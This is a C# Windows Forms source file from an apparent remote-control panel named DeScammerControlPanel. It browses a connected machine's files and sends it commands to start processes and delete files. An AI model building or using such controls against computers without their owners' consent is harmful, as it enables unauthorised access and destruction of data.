using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using DeScammerControlPanel.API;

namespace DeScammerControlPanel
{
    public partial class FileManager : Form
    {
        #region Variables
        public string path = "C:\\"; // The path
        #endregion

        public FileManager()
        {
            InitializeComponent();
        }

        #region Public Functions
        public void AddFile(string file)
        {
            ListViewItem lvi = new ListViewItem(file); // Create the list view item

            listView1.Items.Add(lvi); // Add the list view item
        }
        #endregion

        #region Private Functions
        private void RefreshFiles()
        {
            listView1.Items.Clear(); // Clear the items

            if(Variables.Client != null)
                Variables.Client.Send(CommandManager.FormatCommand("getfiles", new string[] { path })); // Ask for files
        }
        #endregion

        #region Form Functions
        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            RefreshFiles();
        }

        private void FileManager_Load(object sender, EventArgs e)
        {
            RefreshFiles();
        }

        private void listView1_DoubleClick(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count <= 0)
                return;
            if (Variables.Client == null)
                return;

            if (listView1.SelectedItems[0].Text[0] == '\\')
            {
                path = path + listView1.SelectedItems[0].Text;
                RefreshFiles();
            }
            else
            {
                Variables.Client.Send(CommandManager.FormatCommand("processstart", new string[] { path + "\\" + listView1.SelectedItems[0].Text }));
            }
        }

        private void runToolStripMenuItem_Click(object sender, EventArgs e)
        {
            listView1_DoubleClick(null, null);
        }

        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count <= 0)
                return;
            if (Variables.Client == null)
                return;

            Variables.Client.Send(CommandManager.FormatCommand("deletefile", new string[] { path + "\\" + listView1.SelectedItems[0].Text }));
            RefreshFiles();
        }
        #endregion
    }
}
